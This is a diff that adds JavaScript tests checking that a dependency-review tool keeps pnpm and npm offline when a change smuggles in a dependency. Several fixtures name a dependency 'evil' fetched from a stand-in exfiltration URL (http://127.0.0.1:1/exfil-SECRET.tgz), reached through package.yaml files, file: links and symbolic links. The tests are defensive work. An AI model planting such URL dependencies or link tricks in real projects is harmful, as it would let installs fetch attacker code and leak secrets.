@@ -12,6 +12,7 @@ import {
   mkdirSync,
   mkdtempSync,
   rmSync,
+  symlinkSync,
   writeFileSync,
 } from "node:fs";
 import { dirname, join } from "node:path";
@@ -170,11 +171,20 @@ const git = (cwd, ...args) => {
   return result.stdout.trim();
 };
 
-/** Commits `files` (path to content) on `checkout`; returns the commit. */
+/**
+ * Commits `files` (path to content; null removes the file, `{ symlink }`
+ * makes a symbolic link) on `checkout`; returns the commit.
+ */
 function commit(checkout, files) {
   for (const [path, content] of Object.entries(files)) {
-    mkdirSync(dirname(join(checkout, path)), { recursive: true });
-    writeFileSync(join(checkout, path), content);
+    const target = join(checkout, path);
+    if (content === null) {
+      rmSync(target);
+      continue;
+    }
+    mkdirSync(dirname(target), { recursive: true });
+    if (typeof content === "object") symlinkSync(content.symlink, target);
+    else writeFileSync(target, content);
   }
   git(checkout, "add", ".");
   git(checkout, "commit", "--quiet", "-m", "change");
@@ -725,6 +735,253 @@ for (const [shape, workspace, path] of [
     const refusal = await resolutionNetworkRefusal(directory, base, changed);
     assert.match(refusal?.reason ?? "", /from outside the registry/);
   });
+
+// A lockfile as pnpm writes it for a catalog dependency: the importer's
+// specifier is `catalog:`, and the catalog's resolution is recorded apart.
+const CATALOGED = [
+  "packages:",
+  "  - packages/*",
+  "catalog:",
+  "  zod: 4.0.0",
+  "",
+].join("\n");
+const catalogLockfile = [
+  "lockfileVersion: '9.0'",
+  "",
+  "settings:",
+  "  autoInstallPeers: true",
+  "  excludeLinksFromLockfile: false",
+  "",
+  "catalogs:",
+  "  default:",
+  "    zod:",
+  "      specifier: 4.0.0",
+  "      version: 4.0.0",
+  "",
+  "importers:",
+  "",
+  "  .:",
+  "    dependencies:",
+  "      zod:",
+  "        specifier: 'catalog:'",
+  "        version: 4.0.0",
+  "",
+  "packages:",
+  "",
+  "  zod@4.0.0:",
+  "    resolution: {integrity: sha512-AAAA}",
+  "",
+  "snapshots:",
+  "",
+  "  zod@4.0.0: {}",
+  "",
+].join("\n");
+
+test("a repository whose pnpm lockfile records catalog: importers keeps the registry network when its catalog changes", async () => {
+  const { directory, base, changed } = inputs(
+    {
+      "package.json": manifest({ zod: "catalog:" }),
+      "pnpm-lock.yaml": catalogLockfile,
+      "pnpm-workspace.yaml": CATALOGED,
+    },
+    { "pnpm-workspace.yaml": CATALOGED.replace("4.0.0", "4.0.1") },
+  );
+  assert.equal(
+    await installNetworkRefusal(directory, base, changed),
+    undefined,
+  );
+  assert.equal(
+    await resolutionNetworkRefusal(directory, base, changed),
+    undefined,
+  );
+});
+
+test("a lockfile resolution stays offline for a member whose package.json the candidate replaced with a package.yaml", async () => {
+  const { directory, base, changed } = inputs(
+    {
+      ...registryBase(WORKSPACE),
+      "packages/a/package.json": manifest({ "left-pad": "1.0.0" }),
+    },
+    {
+      "packages/a/package.json": null,
+      "packages/a/package.yaml":
+        "name: a\ndependencies:\n  evil: http://127.0.0.1:1/exfil.tgz\n",
+    },
+  );
+  const refusal = await resolutionNetworkRefusal(directory, base, changed);
+  assert.match(
+    refusal?.reason ?? "",
+    /manifest of packages\/a, which has a package\.yaml Factory doesn't read/,
+  );
+  assert.equal(refusal.unverified, undefined);
+});
+
+test("a pnpm resolution verifies the lockfile even when the candidate changed only a member: a file: dependency that links a changed fixture keeps it offline", async () => {
+  const linked = lockfile({ "left-pad": "1.0.0" }).replace(
+    "packages:",
+    [
+      "      app:",
+      "        specifier: file:fixtures/app",
+      "        version: file:fixtures/app",
+      "packages:",
+    ].join("\n"),
+  );
+  const { directory, base, changed } = inputs(
+    {
+      "package.json": manifest({
+        "left-pad": "1.0.0",
+        app: "file:fixtures/app",
+      }),
+      "pnpm-lock.yaml": linked,
+      "pnpm-workspace.yaml": WORKSPACE,
+      "packages/a/package.json": manifest({ "left-pad": "1.0.0" }),
+      "fixtures/app/package.json": manifest({}),
+    },
+    {
+      "packages/a/package.json": manifest({
+        "left-pad": "1.0.0",
+        "is-number": "7.0.0",
+      }),
+      "fixtures/app/package.json": manifest({
+        evil: "http://127.0.0.1:1/exfil.tgz",
+      }),
+    },
+  );
+  const refusal = await resolutionNetworkRefusal(directory, base, changed);
+  assert.match(
+    refusal?.reason ?? "",
+    /pnpm-lock\.yaml has app in \. from outside the registry \(file:fixtures\/app\)/,
+  );
+});
+
+test("a changed manifest outside the members counts when a symbolic link could lead a member to it", async () => {
+  const { directory, base, changed } = inputs(
+    {
+      ...registryBase(WORKSPACE),
+      "fixtures/app/package.json": manifest({}),
+      "packages/app": { symlink: "../fixtures/app" },
+    },
+    { "fixtures/app/package.json": fixture },
+  );
+  const refusal = await resolutionNetworkRefusal(directory, base, changed);
+  assert.match(refusal?.reason ?? "", /fixtures\/app\/package\.json names pad/);
+});
+
+/**
+ * An npm base: package.json and the package-lock.json npm writes for
+ * registry `dependencies` and `links` (name to a checkout directory, a
+ * `file:` dependency).
+ */
+function npmLinked(dependencies, links = {}) {
+  const lock = JSON.parse(npmLockfile(dependencies));
+  const root = { ...dependencies };
+  for (const [name, path] of Object.entries(links)) {
+    root[name] = `file:${path}`;
+    lock.packages[`node_modules/${name}`] = { resolved: path, link: true };
+    lock.packages[path] = { name, version: "1.0.0" };
+  }
+  lock.packages[""].dependencies = root;
+  return {
+    "package.json": manifest(root),
+    "package-lock.json": `${JSON.stringify(lock, null, 2)}\n`,
+  };
+}
+
+const evil = (name) =>
+  `${JSON.stringify({ name, version: "1.0.0", dependencies: { evil: "http://127.0.0.1:1/exfil-SECRET.tgz" } })}\n`;
+
+for (const [shape, base, change] of [
+  [
+    "a file: dependency the candidate adds",
+    npmLinked({ "left-pad": "1.0.0" }),
+    {
+      ...npmLinked({ "left-pad": "1.0.0" }, { x: "vendor/x" }),
+      "vendor/x/package.json": evil("x"),
+    },
+  ],
+  [
+    "a linked directory whose manifest alone the candidate changed",
+    {
+      ...npmLinked({ "left-pad": "1.0.0" }, { app: "fixtures/app" }),
+      "fixtures/app/package.json": manifest({}),
+    },
+    { "fixtures/app/package.json": evil("app") },
+  ],
+  [
+    "a linked directory reached through a symbolic link",
+    {
+      ...npmLinked({ "left-pad": "1.0.0" }, { app: "vendor/app" }),
+      "fixtures/app/package.json": manifest({}),
+      vendor: { symlink: "fixtures" },
+    },
+    { "fixtures/app/package.json": evil("app") },
+  ],
+])
+  test(`npm's install and resolution stay offline when a linked manifest names a URL: ${shape}`, async () => {
+    const { directory, base: planned, changed } = inputs(base, change);
+    for (const check of [installNetworkRefusal, resolutionNetworkRefusal]) {
+      const refusal = await check(directory, planned, changed);
+      assert.match(
+        refusal?.reason ?? "",
+        /(?:which npm links, names evil from outside the registry|npm links vendor\/app, and the candidate has no tracked package\.json)/,
+        check.name,
+      );
+      assert.equal(refusal.unverified, undefined);
+    }
+  });
+
+test("npm's resolution stays offline for a linked directory's changed manifest when the candidate made the lockfile stale", async () => {
+  const linked = npmLinked({ "left-pad": "1.0.0" }, { app: "fixtures/app" });
+  const stale = JSON.parse(linked["package-lock.json"]);
+  stale.packages[""].dependencies = {};
+  const { directory, base, changed } = inputs(
+    { ...linked, "fixtures/app/package.json": manifest({}) },
+    {
+      "package-lock.json": `${JSON.stringify(stale, null, 2)}\n`,
+      "fixtures/app/package.json": evil("app"),
+    },
+  );
+  const refusal = await resolutionNetworkRefusal(directory, base, changed);
+  assert.match(refusal?.reason ?? "", /which npm links, names evil/);
+});
+
+test("npm keeps the registry network for a linked directory whose manifest names the registry, and counts every changed manifest", async () => {
+  const linked = npmLinked({ "left-pad": "1.0.0" }, { app: "fixtures/app" });
+  const registry = inputs(
+    { ...linked, "fixtures/app/package.json": manifest({}) },
+    { "fixtures/app/package.json": manifest({ "is-number": "^7.0.0" }) },
+  );
+  assert.equal(
+    await installNetworkRefusal(
+      registry.directory,
+      registry.base,
+      registry.changed,
+    ),
+    undefined,
+  );
+  assert.equal(
+    await resolutionNetworkRefusal(
+      registry.directory,
+      registry.base,
+      registry.changed,
+    ),
+    undefined,
+  );
+  // An unlinked manifest still counts with npm, as it did before #2099.
+  const unlinked = inputs(npmLinked({ "left-pad": "1.0.0" }), {
+    "test/fixtures/app/package.json": fixture,
+  });
+  assert.match(
+    (
+      await resolutionNetworkRefusal(
+        unlinked.directory,
+        unlinked.base,
+        unlinked.changed,
+      )
+    )?.reason ?? "",
+    /test\/fixtures\/app\/package\.json names pad from outside the registry/,
+  );
+});
 
 test("the planner and plan review learn who resolves a dependency change's lockfile", () => {
   assert.match(
